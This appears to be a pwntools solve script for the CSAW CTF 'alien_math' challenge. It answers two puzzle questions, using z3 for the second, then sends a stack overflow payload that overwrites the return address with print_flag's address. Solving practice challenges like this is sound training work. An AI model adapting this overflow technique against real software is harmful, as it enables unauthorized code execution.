#!/usr/bin/env python3
from pwn import *
import sys
import angr
import claripy
from z3 import *

e = ELF('./alien_math')
binary_name = './alien_math'

remote_solve = True

if remote_solve == True:
	r = remote('pwn.chal.csaw.io', 5004)
	#r = remote(, 5004)
else:	
	r = process('./alien_math')

addr = (e.symbols['print_flag'])

print(addr)
print(r.recvuntil('zopnol?\n'))

#found by using gdb
print("Sending 1804289383...")
r.sendline('1804289383')
print(r.recvuntil('qorbnorbf?'))

r.recvline()

# Second question answer is 7856445899213065428791
print("Solving Question 2...")

def func(a1,a2):
    return (a1*48+11*a2-4)%10

rrr='7759406485255323229225'
flag='7'
for x in range(21):
    n = Int('n')
    s = Solver()
    init=int(rrr[x])
    t=int(rrr[x+1])
    s.add(t==(n+func(init,init+x))%10)
    s.add(n<10)
    s.add(n>=0)
    res=s.check()
    if(str(res)!='sat'):
        exit(1)
    m=s.model()
    res=str(m[m.decls()[0]])
    flag+=res

print(f"Sending {flag} for question 2.")

r.sendline(flag)

print(r.recvuntil('salwzoblrs?\n'))

#time to overflow
print("Sending payload (overflow followed by address of print_flag)...")
payload = (b'A'*24 + p64(addr))
r.sendline(payload)

print(r.recvall())
